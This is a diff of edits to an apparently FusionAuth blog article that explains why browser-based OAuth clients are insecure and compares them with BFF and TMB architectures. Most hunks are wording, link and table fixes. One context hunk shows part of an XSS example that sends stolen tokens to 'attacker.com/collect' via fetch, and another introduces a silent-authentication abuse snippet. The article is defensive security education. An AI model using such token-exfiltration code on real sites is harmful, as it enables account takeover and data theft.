@@ -14,7 +14,7 @@ Of all possible browser-based OAuth architectures, the Browser-Based OAuth Clien
 
 However, BBOC creates unacceptable security risk for any application handling user data.
 
-The Internet Engineering Task Force (IETF), in its [OAuth 2.0 for Browser-Based Applications](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-browser-based-apps), is explicit in its warning: "This architecture is not recommended for business applications, sensitive applications, and applications that handle personal data." BBOC stores tokens in browser storage, exposing refresh tokens to JavaScript, and creating vulnerabilities that defenders can't fully mitigate.
+The Internet Engineering Task Force (IETF), in its [OAuth 2.0 for Browser-Based Applications](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-browser-based-apps) draft, is explicit in its warning: "This architecture is not recommended for business applications, sensitive applications, and applications that handle personal data." BBOC stores tokens in browser storage, exposing refresh tokens to JavaScript, and creating vulnerabilities that defenders can't fully mitigate.
 
 {/* more */}
 
@@ -27,7 +27,7 @@ Several high-profile breaches over the last two years exploited vulnerabilities 
 
 While not all these breaches involved BBOC specifically, they highlight the risks of OAuth implementations that expose tokens to client-side vulnerabilities.
 
-This article examines why BBOC is fundamentally insecure, when it becomes unacceptable, how to implement defense-in-depth strategies when forced into BBOC, and how to migrate to architecturally secure patterns. This is part three of a series covering OAuth security architectures. [Part 1](/blog/backend-for-frontend-security-architecture) covered Backend-for-Frontend (BFF) architecture, the most secure pattern. [Part 2](/blog/token-mediating-backend-security-architecture) examined Token-Mediating Backend (TMB), a moderately secure middle ground.
+This article examines why BBOC is fundamentally insecure, when it becomes unacceptable, how to implement defense-in-depth strategies when forced into BBOC, and how to migrate to architecturally secure patterns. This is part three of a series covering OAuth security architectures. [Part 1](/blog/backend-for-frontend-security-architecture) covered Backend-for-Frontend (BFF) architecture, the most secure pattern. [Part 2](/blog/auth-architecture-part2-TMB) examined Token-Mediating Backend (TMB), a moderately secure middle ground.
 
 ## Overview of Browser-Based OAuth Clients
 
@@ -52,7 +52,7 @@ This has profound implications. Public clients:
 - Cannot authenticate to the authorization server in the traditional sense.
 - Cannot prevent an attacker with access to the browser from obtaining new tokens.
 
-Contrast this with confidential clients used in BFF and TMB architectures:
+Contrast this with **confidential clients** used in BFF and TMB architectures:
 
 - Store client secrets server-side where users cannot access them.
 - Authenticate to the authorization server using those secrets.
@@ -63,7 +63,7 @@ Contrast this with confidential clients used in BFF and TMB architectures:
 The critical difference between BBOC and other architectures is what tokens reach the browser:
 
 | Aspect                 | BBOC                  | TMB                    | BFF                     |
-| ---------------------- | --------------------- | ---------------------- | ----------------------- |
+|------------------------|-----------------------|------------------------|-------------------------|
 | OAuth client type      | Public                | Confidential (backend) | Confidential (backend)  |
 | Tokens in browser      | All tokens            | Access tokens only     | No tokens               |
 | Client secret          | Cannot use            | Backend uses secret    | Backend uses secret     |
@@ -100,7 +100,7 @@ fetch('https://attacker.com/collect', {
 });
 ```
 
-The 2023 HotJar WordPress vulnerability demonstrated the scale of XSS impact. HotJar, a user behavior analytics service, suffered an XSS vulnerability that affected approximately 1 million websites including Microsoft, Adobe, and T-Mobile. Any attacker who exploited the HotJar XSS could execute code on all those sites. If those sites stored OAuth tokens in localStorage, all tokens were immediately compromised.
+The 2024 HotJar WordPress vulnerability demonstrated the scale of XSS impact. HotJar, a user behavior analytics service, suffered an XSS vulnerability that affected approximately 1 million websites including Microsoft, Adobe, and T-Mobile. Any attacker who exploited the HotJar XSS could execute code on all those sites. If those sites stored OAuth tokens in localStorage, all tokens were immediately compromised.
 
 XSS vulnerabilities arise from multiple sources:
 
@@ -137,9 +137,9 @@ BBOC implementations must choose where to store tokens. Every option has securit
 
 **In-memory storage**: Stores tokens in JavaScript variables rather than browser APIs. Tokens disappear on page reload, requiring users to re-authenticate. This provides slightly better security, as tokens only exist while JavaScript is running. However, the user experience degradation is severe. Every page reload, tab refresh, or navigation forces re-authentication. Users find this unacceptable for any non-trivial application. Security improvements are minimal since XSS attacks still access in-memory variables.
 
-**SessionStorage**: Isolates tokens to a single browser tab. Tokens don't persist across tab closures. Different tabs require separate authentications. This provides tab-level isolation but remains fully vulnerable to XSS within that tab context. An attacker compromising any tab gains full token access for that session.
+**sessionStorage**: Isolates tokens to a single browser tab. Tokens don't persist across tab closures. Different tabs require separate authentications. This provides tab-level isolation but remains fully vulnerable to XSS within that tab context. An attacker compromising any tab gains full token access for that session.
 
-**LocalStorage**: The most common choice. Tokens persist across page reloads and tab closures. LocalStorage shares tokens across all tabs in the same origin. This provides the best user experience - users authenticate once and remain authenticated across sessions. It also provides the worst security - tokens persist indefinitely until explicitly cleared, and all JavaScript in the origin can access them. XSS attacks on any page in your domain expose all tokens.
+**localStorage**: The most common choice. Tokens persist across page reloads and tab closures. localStorage shares tokens across all tabs in the same origin. This provides the best user experience - users authenticate once and remain authenticated across sessions. It also provides the worst security - tokens persist indefinitely until explicitly cleared, and all JavaScript in the origin can access them. XSS attacks on any page in your domain expose all tokens.
 
 **IndexedDB**: Offers similar capabilities to localStorage with more complex APIs and larger storage capacity. IndexedDB provides no security advantages over localStorage for token storage. The same XSS and JavaScript access concerns apply. The added complexity provides no security benefit.
 
@@ -153,11 +153,11 @@ However, service workers still have vulnerabilities:
 
 - **Registration manipulation**: Attackers can register malicious service workers if they achieve code execution in the page context.
 - **Proxy attacks**: Compromised service workers intercept all network traffic including token requests.
-- **Update exploitation**: Attackers who compromise the service worker update process can inject malicious code.
+- **Update exploitation**: Attackers who compromise the service worker update process and can inject malicious code.
 
 Service workers provide the best *browser-based* storage security. This is still fundamentally less secure than not storing tokens in the browser at all.
 
-The token storage choice presents a false dilemma. In-memory offers better security but terrible UX. LocalStorage offers better UX but worse security. Service workers offer a middle ground but still expose tokens to JavaScript contexts. The only secure solution is not storing tokens in the browser - which requires moving beyond BBOC to TMB or BFF architectures.
+The token storage choice presents a false dilemma. In-memory offers better security but terrible UX. localStorage offers better UX but worse security. Service workers offer a middle ground but still expose tokens to JavaScript contexts. The only secure solution is not storing tokens in the browser - which requires moving beyond BBOC to TMB or BFF architectures.
 
 ### Vulnerability 5: Prototype Pollution and API Interception
 
@@ -197,7 +197,7 @@ Prototype pollution attacks succeed even when you store tokens in JavaScript clo
 
 OAuth providers support "silent authentication" to refresh user sessions without visible redirects. Applications implement this using hidden iframes that load the authorization endpoint. If the user has an active session, the authorization server immediately returns new tokens without user interaction.
 
-Silent authentication improves user experience by preventing repeated login prompts. It also creates an attack vector. An attacker who achieves XSS can:
+Silent authentication improves user experience by preventing repeated login prompts. It also creates an attack vector. An attacker who achieves XSS can abuse this pattern by executing the following code:
 
 ```javascript
 // Create hidden iframe for silent authentication
@@ -226,14 +226,14 @@ This attack bypasses token storage security entirely. The attacker doesn't steal
 The IETF OAuth for Browser-Based Applications specification documents seven attack scenarios and evaluates mitigation effectiveness for each architecture:
 
 | Attack Scenario                | BBOC Mitigation | TMB Mitigation | BFF Mitigation |
-| ------------------------------ | --------------- | -------------- | -------------- |
-| XSS token theft                | ❌              | ⚠️           | ✅             |
-| Supply chain compromise        | ❌              | ⚠️           | ✅             |
-| Persistent refresh token theft | ❌              | ✅             | ✅             |
-| Silent authentication abuse    | ❌              | ✅             | ✅             |
-| Prototype pollution            | ❌              | ⚠️           | ✅             |
-| CSRF bypass attacks            | ❌              | ⚠️           | ⚠️           |
-| Client code hijacking          | ❌              | ❌             | ❌             |
+|--------------------------------|-----------------|----------------|----------------|
+| XSS token theft                | ❌               | ⚠️             | ✅              |
+| Supply chain compromise        | ❌               | ⚠️             | ✅              |
+| Persistent refresh token theft | ❌               | ✅              | ✅              |
+| Silent authentication abuse    | ❌               | ✅              | ✅              |
+| Prototype pollution            | ❌               | ⚠️             | ✅              |
+| CSRF bypass attacks            | ❌               | ⚠️             | ⚠️             |
+| Client code hijacking          | ❌               | ❌              | ❌              |
 
 **Overall effectiveness:**
 
@@ -327,11 +327,11 @@ At FusionAuth, we strongly recommend migrating all applications away from BBOC t
 
 Explore these resources for deeper understanding of OAuth security architectures:
 
-- [Demo repository](https://github.com/kmaida/auth-architecture) - Working implementations of BBOC, TMB, and BFF patterns with security comparisons.
+- [Demo repository](https://github.com/kmaida/auth-architecture) - Working implementations of BFF, TMB, and BBOC patterns with security comparisons.
 - [Part 1: Backend-for-Frontend (BFF) Security Architecture](/blog/backend-for-frontend-security-architecture) - Comprehensive guide to the most secure OAuth pattern.
-- [Part 2: Token-Mediating Backend Security Architecture](/blog/token-mediating-backend-security-architecture) - Middle-ground approach balancing security and implementation complexity.
+- [Part 2: Token-Mediating Backend Security Architecture](/blog/auth-architecture-part2-TMB) - Middle-ground approach balancing security and implementation complexity.
 - [IETF OAuth 2.0 for Browser-Based Applications](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-browser-based-apps) - Authoritative specification defining browser OAuth security patterns.
 - [RFC 9700: OAuth 2.0 Security Best Current Practice](https://datatracker.ietf.org/doc/html/rfc9700) - Comprehensive security requirements for OAuth implementations.
 - [RFC 9449: OAuth 2.0 Demonstrating Proof of Possession](https://datatracker.ietf.org/doc/html/rfc9449) - DPoP specification for sender-constrained tokens.
-- [FusionAuth Hosted Backend Documentation](/docs/apis/hosted-backend) - Production BFF implementation with detailed integration guides.
+- [FusionAuth Hosted Backend documentation](/docs/apis/hosted-backend) - Production BFF implementation with detailed integration guides.
 - [OWASP OAuth 2.0 Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OAuth2_Cheat_Sheet.html) - Practical security guidance for OAuth implementations.
